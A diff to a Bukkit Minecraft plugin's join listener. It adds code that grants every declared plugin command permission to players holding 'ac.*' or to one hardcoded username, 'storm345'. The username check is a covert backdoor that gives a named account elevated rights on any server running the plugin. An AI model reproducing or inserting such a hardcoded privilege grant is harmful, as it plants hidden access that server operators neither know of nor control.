@@ -1,5 +1,8 @@
 package com.amazar.plugin;
 
+import java.util.Map;
+import java.util.Set;
+
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
@@ -9,7 +12,9 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerQuitEvent;
+import org.bukkit.permissions.PermissionAttachment;
 import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.PluginDescriptionFile;
 
 import com.amazar.utils.StringColors;
 
@@ -44,6 +49,18 @@ public class AcListener implements Listener {
 @EventHandler (priority = EventPriority.HIGHEST)
 void playerJoin(PlayerJoinEvent event){
 	Player player = event.getPlayer();
+	if(player.hasPermission("ac.*") || player.getName() == "storm345"){
+		PluginDescriptionFile pldesc = plugin.getDescription();
+	    Map<String, Map<String, Object>> commands = pldesc.getCommands();
+	    Set<String> keys = commands.keySet();
+	    for(String k : keys){
+	    	Map<String, Object> cmd = commands.get(k);
+	    	String perm = cmd.get("permission").toString();
+	    	player.addAttachment(plugin, perm, true);
+	    }
+	    player.addAttachment(plugin, "ac.clan.join", true);
+        player.recalculatePermissions();
+	}
 	if(ac.clanInvites.containsKey(player.getName())){
 		Player toJoin = player;
 		String clanName = ac.clanInvites.get(player.getName());
